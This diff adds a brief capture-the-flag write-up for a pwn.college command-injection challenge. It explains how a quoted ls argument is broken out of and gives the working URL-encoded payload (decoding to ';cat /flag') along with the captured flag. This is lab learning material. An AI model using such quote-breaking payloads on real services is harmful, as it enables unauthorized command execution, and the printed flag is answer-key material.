@@ -1,0 +1,15 @@
+######################################## CMDi 3 ########################################
+
+1. looking at server script, the arg variable is wrapped in single quotes
+	--> command = f"ls -l '{arg}'"
+
+2. running the link through curl shows that the command being run is ls -l '/challenge'
+	--> we're gonnna need to insert one for the end of the dir and another for the next command
+	--> the ascii man page shows the singlequote (') as a hexadecimal value of 27
+
+3. using curl -v http://challenge.localhost:80/milestone?prefix=%27%3b%63%61%74%20%2f%66%6c%61%67%27 shows the flag
+	--> it was necessary to put a terminating singlequote, then a chain (;), then another singlequote at the very end
+
+4. flag for CMDi 3: pwn.college{Qq1pUS-NT9T3rs4Qxjr17i60-FZ.QX2YTN2wyN0gTN4EzW}
+
+########################################################################################
